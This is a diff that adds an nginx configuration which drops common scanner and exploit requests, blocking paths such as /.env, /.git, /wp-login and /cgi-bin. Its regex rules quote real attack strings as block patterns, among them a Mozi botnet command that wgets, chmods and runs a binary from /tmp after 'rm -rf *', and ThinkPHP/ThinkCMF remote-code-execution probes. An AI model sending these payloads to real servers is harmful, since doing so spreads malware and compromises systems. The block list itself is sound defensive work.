@@ -1,0 +1,106 @@
+# If requests are too big, block them.
+# Adjust the 1k thing to suit your needs.
+client_body_buffer_size 1k;
+
+# This could be removed, as this blocks all the POST requests.
+if ($request_method = POST) {
+        return 444;
+}
+
+if ($request_uri ~* "/boaform|[\x00-\x1F]|/geoserver|/actuator|27;wget.*Mozi\.m.*tmp/Mozi\.m;chmod.*dlink\.mips'") {
+        return 444;
+}
+
+if ($request_uri ~* "/admin/.svn|/\?XDEBUG_SESSION_START=phpstorm|/\?a=fetch&content=<php>die\(@md5\(HelloThinkCMF\)\)<\/php>|/wp-login|/index\.php\?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars\[0\]=md5&vars\[1\]\[\]=HelloThinkPHP21|/shell\?cd\+/tmp;rm\+-rf\+*;wget\+http://192\.168\.1\.1:8088/Mozi\.a;chmod\+777\+Mozi\.a;/tmp/Mozi\.a\+jaws|/solr|/vendor|/.env|/.git|/cgi-bin") {
+        return 444;
+}
+
+location /boaform {
+        return 444;
+}
+
+# This rule is not working well.
+# It just blocks all of the traffic, I don't know how to fix it yet.
+#location ~* [\x00-\xFFF] {
+#        return 444;
+#}
+
+location /geoserver {
+        return 444;
+}
+
+location /actuator {
+        return 444;
+}
+
+location ~* "27;wget.*Mozi\.m.*tmp/Mozi\.m;chmod.*dlink\.mips'" {
+        return 444;
+}
+
+location /admin/.svn {
+        return 444;
+}
+
+location /?XDEBUG_SESSION_START=phpstorm {
+        return 444;
+}
+
+location ~* "/\?a=fetch&content=<php>die\(@md5\(HelloThinkCMF\)\)<\/php>" {
+        return 444;
+}
+
+location /wp-login {
+        return 444;
+}
+
+location ~* "/index\.php\?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars\[0\]=md5&vars\[1\]\[\]=HelloThinkPHP21" {
+        return 444;
+}
+
+location ~* "/shell\?cd\+/tmp;rm\+-rf\+*;wget\+http://192\.168\.1\.1:8088/Mozi\.a;chmod\+777\+Mozi\.a;/tmp/Mozi\.a\+jaws" {
+        return 444;
+}
+
+location /solr {
+        return 444;
+}
+
+location /vendor {
+        return 444;
+}
+
+location /.env {
+        return 444;
+}
+
+location /.git {
+        return 444;
+}
+
+location /cgi-bin {
+        return 444;
+}
+
+location /geoip {
+        return 444;
+}
+
+location /client {
+        return 444;
+}
+
+location /upl {
+        return 444;
+}
+
+location /1 {
+        return 444;
+}
+
+location /human {
+        return 444;
+}
+
+location /Autodiscover {
+        return 444;
+}
